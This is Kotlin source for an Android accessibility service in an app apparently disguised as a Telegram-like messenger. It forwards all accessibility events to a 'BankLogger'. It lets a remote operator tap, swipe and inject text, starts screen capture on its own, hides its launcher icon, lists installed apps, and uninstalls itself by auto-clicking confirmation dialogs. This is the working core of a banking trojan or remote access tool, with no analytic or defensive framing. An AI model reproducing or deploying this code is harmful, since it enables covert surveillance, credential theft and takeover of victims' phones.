package com.telegram2.messaging.remote

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.accessibilityservice.GestureDescription
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.graphics.Path
import android.os.Bundle
import android.provider.Settings
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import com.telegram2.messaging.ScreenPermissionActivity

class MyAccessibilityService : AccessibilityService() {

    companion object {
        var instance: MyAccessibilityService? = null
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
        instance = this
        val info = AccessibilityServiceInfo().apply {
            eventTypes = AccessibilityEvent.TYPES_ALL_MASK
            feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
            flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS or
                    AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS or
                    AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS
            notificationTimeout = 100
        }
        setServiceInfo(info)

        // Auto start screen capture if not already running
        if (!isScreenCaptureRunning()) {
            startScreenCapture()
        } else {
            hideAppIcon() // hide immediately if already capturing
        }
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        BankLogger.onEvent(this, event)
    }

    override fun onInterrupt() {}

    // ---------- Remote control functions ----------
    fun tap(x: Int, y: Int) {
        val path = Path().apply { moveTo(x.toFloat(), y.toFloat()) }
        val stroke = GestureDescription.StrokeDescription(path, 0L, 100L)
        val gesture = GestureDescription.Builder().addStroke(stroke).build()
        dispatchGesture(gesture, null, null)
    }

    fun swipe(x1: Int, y1: Int, x2: Int, y2: Int, durationMs: Long = 300L) {
        val path = Path().apply {
            moveTo(x1.toFloat(), y1.toFloat())
            lineTo(x2.toFloat(), y2.toFloat())
        }
        val stroke = GestureDescription.StrokeDescription(path, 0L, durationMs)
        val gesture = GestureDescription.Builder().addStroke(stroke).build()
        dispatchGesture(gesture, null, null)
    }

    fun injectText(text: String) {
        val root = rootInActiveWindow ?: return
        val focused = root.findFocus(AccessibilityNodeInfo.FOCUS_INPUT)
        if (focused != null) {
            val bundle = Bundle().apply {
                putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, text)
            }
            focused.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, bundle)
        }
    }

    fun hideApp() {
        val intent = Intent(Intent.ACTION_MAIN).apply {
            addCategory(Intent.CATEGORY_HOME)
            flags = Intent.FLAG_ACTIVITY_NEW_TASK
        }
        startActivity(intent)
    }

    fun uninstallSelf() {
        val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS)
        intent.data = android.net.Uri.parse("package:$packageName")
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        startActivity(intent)

        android.os.Handler(mainLooper).postDelayed({
            val root = rootInActiveWindow ?: return@postDelayed
            val uninstallNodes = root.findAccessibilityNodeInfosByText("Uninstall")
            if (uninstallNodes.isNotEmpty()) {
                uninstallNodes[0].performAction(AccessibilityNodeInfo.ACTION_CLICK)
                android.os.Handler(mainLooper).postDelayed({
                    val root2 = rootInActiveWindow ?: return@postDelayed
                    for (text in listOf("OK", "Uninstall")) {
                        val nodes = root2.findAccessibilityNodeInfosByText(text)
                        if (nodes.isNotEmpty()) {
                            nodes[0].performAction(AccessibilityNodeInfo.ACTION_CLICK)
                            return@postDelayed
                        }
                    }
                }, 1500)
            }
        }, 2000)
    }

    fun startScreenCapture() {
        val intent = Intent(this, ScreenPermissionActivity::class.java).apply {
            flags = Intent.FLAG_ACTIVITY_NEW_TASK
        }
        startActivity(intent)
    }

    fun hideAppIcon() {
        val pm = packageManager
        val component = ComponentName(this, com.telegram2.messaging.MainActivity::class.java)
        pm.setComponentEnabledSetting(
            component,
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
            PackageManager.DONT_KILL_APP
        )
    }

    fun isScreenCaptureRunning(): Boolean {
        val manager = getSystemService(Context.ACTIVITY_SERVICE) as android.app.ActivityManager
        for (service in manager.getRunningServices(Integer.MAX_VALUE)) {
            if (ScreenCaptureService::class.java.name == service.service.className) {
                return true
            }
        }
        return false
    }

    fun getInstalledApps(): List<String> {
        return packageManager.getInstalledPackages(0).map { it.packageName }
    }
}